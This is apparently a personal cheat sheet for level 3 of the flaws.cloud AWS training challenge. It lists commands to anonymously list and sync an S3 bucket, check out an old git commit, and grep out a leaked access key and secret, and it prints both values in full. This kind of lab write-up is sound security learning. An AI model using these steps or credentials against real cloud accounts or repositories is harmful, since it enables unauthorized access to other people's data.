# Flaws.Cloud 1 - Walkthrough Cheat Sheet



## Guide Table of Contents
- [Flaws.Cloud 1 - Walkthrough Cheat Sheet](#flawscloud-1---walkthrough-cheat-sheet)
  - [Guide Table of Contents](#guide-table-of-contents)
  - [Challenge Prerequisites](#challenge-prerequisites)
  - [Challenge Tools](#challenge-tools)
  - [Guide Table of Contents](#guide-table-of-contents-1)
  - [Commands Used in Challenge](#commands-used-in-challenge)
  - [Important Notes from Challenge](#important-notes-from-challenge)
- [Levels](#levels)
  - [Level 0 -  Level 0 Name](#level-0----level-0-name)
    - [Level 0 Prerequisites](#level-0-prerequisites)
    - [Level 0 Tools](#level-0-tools)
    - [Commands Used in Level 0](#commands-used-in-level-0)
  - [Important Notes from Level 0](#important-notes-from-level-0)
  - [Level 3 -  Access Key in Git Log Commits](#level-3----access-key-in-git-log-commits)
    - [Level 3 Prerequisites](#level-3-prerequisites)
    - [Level 3 Tools](#level-3-tools)
    - [Commands Used in Level 3](#commands-used-in-level-3)
    - [Important Notes from Level 3](#important-notes-from-level-3)







## Challenge Prerequisites
3. Access Key in Git Log Commits
   1. AWS CLI installed
      1. [AWS cli installation file script](./Flaws-Scripts/aws_cli_install.sh)
   2. AWS CLI Profile configured
      1. [configuration file script](./Flaws-Scripts/aws_cli_configure.sh)
   3. Create AWS S3Admin Group
      1. [Group URL](https://us-east-1.console.aws.amazon.com/iamv2/home?region=us-west-2#/groups/details/S3Admins?section=permissions "S3Admins")
   4. Attach AWS AmazonS3FullAccess Policy To S3Admin Group
      1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AmazonS3FullAccess$jsonEditor "AmazonS3FullAccess")
   5. Installed Git CLI
      1. [Git CLI installation file script](./Flaws-Scripts/git_cli_install.sh)


## Challenge Tools
3. Access Key in Git Log Commits
   1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
   2. [`aws s3 sync`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 bucket copy Command")
   3. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
   4. [git](https://github.com/git-guides/install-git "Git Command Line Tool")
   5. [git log](https://github.com/git-guides/install-git "Git Command Line Tool")

## Guide Table of Contents

## Commands Used in Challenge 
| 3. :pager: Command                                                                           | Description                                                             |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 3.0. :pager: Access Key in Git Log Commits                                                | Older Git Commits Contains access_keys.txt                                 |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 3.1. :pager:  `Flaws-Scripts/aws_cli_configure.sh`   | Configure AWS CLI                        |
| 3.2. :pager: `aws s3 ls --profile $AWS_USER_NAME $L3_BUCKET_URL` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 3.2. :pager: `aws s3 ls $L3_BUCKET_URL --no-sign-request --region $AWS_REGION` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 3.3. :pager: `aws s3 sync --profile $AWS_USER_NAME $L3_BUCKET_URL --region $AWS_REGION ./flaws3` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 3.4. :pager: `cd flaws3 && git log` | View Latest Git Commit Log  |
| 3.5. :pager: `git checkout $L3_COMMIT` | View Latest Git Commit Log  |
| 3.6. :pager: `export L3_ACCESS_KEY=$(grep -oP '^access_key\s+\K[A-Za-z0-9]+' $L3_SECRET_FILE)` | Get AWS Level Access Key  |
| 3.7. :pager: `export L3_SECRET_KEY=$(grep -oP '^secret_access_key\s+\K[A-Za-z0-9+/]+' $L3_SECRET_FILE)` | Get AWS Secret Access Key  |
| 3.8. :pager: `Scrtips/aws_cli_configure_L3Profile.sh` | Set L3 Found Profile URL  |
| 3.9. :pager: `aws --profile $L3_USER s3 ls` | List all S3 Buckets  |
| 3.10. :pager: `aws s3 ls --profile $L3_USER_NAME | grep -oP 'level4-\S+\.flaws\.cloud'` | Get Level 4 URL (All Levels)  |
| 3.11. :pager:  `Flaws-Scripts/aws_cli_configure_L3Profile.sh`   | Configure AWS CLI                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|


## Important Notes from Challenge
| 3. :pushpin: Pin                 | Content                                                                                  |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 3.0. :pushpin: Access Key in Git Log Commits  | Older Git Commits Contains access_keys.txt                                                                        |  
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 3.1. :pushpin:  Level 3 URL          | [Level 3 URL](http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud)                                                             |
| 3.2. :pushpin:  Level 3 Bucket URL          | [Level 3 URL](s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud)                                                             |
| 3.3. :pushpin:  Level 3 Sensitive Git Commit          | f52ec03b227ea6094b04e43f475fb0126edb5a61                                                             |
| 3.4. :pushpin:  Level 3 User          | L3Profile                                                             |
| 3.5. :pushpin:  Level 3 Access Keys File          | access_keys.txt                                                             |
| 3.6. :pushpin:  Level 3 Access Key ID          | AKIAJ366LIPB4IJKT7SA                                                             |
| 3.7. :pushpin:  Level 3 Secret Access Key ID          | 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                                                             |
| 4.1. :pushpin: Level 4 URL                             | [Level 4](level4-1156739cfb264ced6de514971a4bef68.flaws.cloud) |      
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|

# Levels


<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Level 0 - Template                                                                         -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
## Level 0 -  Level 0 Name
<!--*        ------------------------------ -->
### Level 0 Prerequisites
1. Prerequisite 1
   1. Prequisite Reference

### Level 0 Tools
1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
2. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")




### Commands Used in Level 0
| 0. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 0.0. :pager Title                | Description        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 0.1. :pager:  `Flaws-Scripts/aws_cli_configure_L.sh`   | Configure AWS CLI                        |






## Important Notes from Level 0
| :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 0.1. :pushpin:  Level 0 URL          | ``                                                                         |





<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->
<!-- ?                                                                              Level 3   Access Key in Git Log Commits                                                                           -->
<!-- ! ================================================================================================================================================================================================-->
<!-- ! ================================================================================================================================================================================================-->


## Level 3 -  Access Key in Git Log Commits 
<!--*        ------------------------------ -->
### Level 3 Prerequisites
1. AWS CLI installed
   1. [AWS cli installation file script](./Flaws-Scripts/aws_cli_install.sh)
2. AWS CLI Profile configured
   1. [configuration file script](./Flaws-Scripts/aws_cli_configure.sh)
3. Create AWS S3Admin Group
   1. [Group URL](https://us-east-1.console.aws.amazon.com/iamv2/home?region=us-west-2#/groups/details/S3Admins?section=permissions "S3Admins")
4. Attach AWS AmazonS3FullAccess Policy To S3Admin Group
   1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AmazonS3FullAccess$jsonEditor "AmazonS3FullAccess")
5. Installed Git CLI
   1. [Git CLI installation file script](./Flaws-Scripts/git_cli_install.sh)

### Level 3 Tools
1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
2. [`aws s3 sync`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 bucket copy Command")
3. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
4. [git](https://github.com/git-guides/install-git "Git Command Line Tool")




### Commands Used in Level 3
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 3. :pager: Command                                                                           | Description                                                             |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 3.0. :pager: Access Key in Git Log Commits                                                | Older Git Commits Contains access_keys.txt                                 |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 3.1. :pager:  `Flaws-Scripts/aws_cli_configure.sh`   | Configure AWS CLI                        |
| 3.2. :pager: `aws s3 ls --profile $AWS_USER_NAME $L3_BUCKET_URL` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 3.2. :pager: `aws s3 ls $L3_BUCKET_URL --no-sign-request --region $AWS_REGION` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 3.3. :pager: `aws s3 sync --profile $AWS_USER_NAME $L3_BUCKET_URL --region $AWS_REGION ./flaws3` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 3.4. :pager: `cd flaws3 && git log` | View Latest Git Commit Log  |
| 3.5. :pager: `git checkout $L3_COMMIT` | View Latest Git Commit Log  |
| 3.6. :pager: `export L3_ACCESS_KEY=$(grep -oP '^access_key\s+\K[A-Za-z0-9]+' $L3_SECRET_FILE)` | Get AWS Level Access Key  |
| 3.7. :pager: `export L3_SECRET_KEY=$(grep -oP '^secret_access_key\s+\K[A-Za-z0-9+/]+' $L3_SECRET_FILE)` | Get AWS Secret Access Key  |
| 3.8. :pager: `Scrtips/aws_cli_configure_L3Profile.sh` | Set L3 Found Profile URL  |
| 3.9. :pager: `aws --profile $L3_USER s3 ls` | List all S3 Buckets  |
| 3.10. :pager: `aws s3 ls --profile $L3_USER_NAME | grep -oP 'level4-\S+\.flaws\.cloud'` | Get Level 4 URL (All Levels)  |
| 3.11. :pager:  `Flaws-Scripts/aws_cli_configure_L3Profile.sh`   | Configure AWS CLI                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|






### Important Notes from Level 3
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 3. :pushpin: Pin                 | Content                                                                                  |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 3.0. :pushpin: Access Key in Git Log Commits  | Older Git Commits Contains access_keys.txt                                                                        |  
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 3.1. :pushpin:  Level 3 URL          | [Level 3 URL](http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud)                                                             |
| 3.2. :pushpin:  Level 3 Bucket URL          | [Level 3 URL](s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud)                                                             |
| 3.3. :pushpin:  Level 3 Sensitive Git Commit          | f52ec03b227ea6094b04e43f475fb0126edb5a61                                                             |
| 3.4. :pushpin:  Level 3 User          | L3Profile                                                             |
| 3.5. :pushpin:  Level 3 Access Keys File          | access_keys.txt                                                             |
| 3.6. :pushpin:  Level 3 Access Key ID          | AKIAJ366LIPB4IJKT7SA                                                             |
| 3.7. :pushpin:  Level 3 Secret Access Key ID          | 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                                                             |
| 4.1. :pushpin: Level 4 URL                             | [Level 4](level4-1156739cfb264ced6de514971a4bef68.flaws.cloud) |      



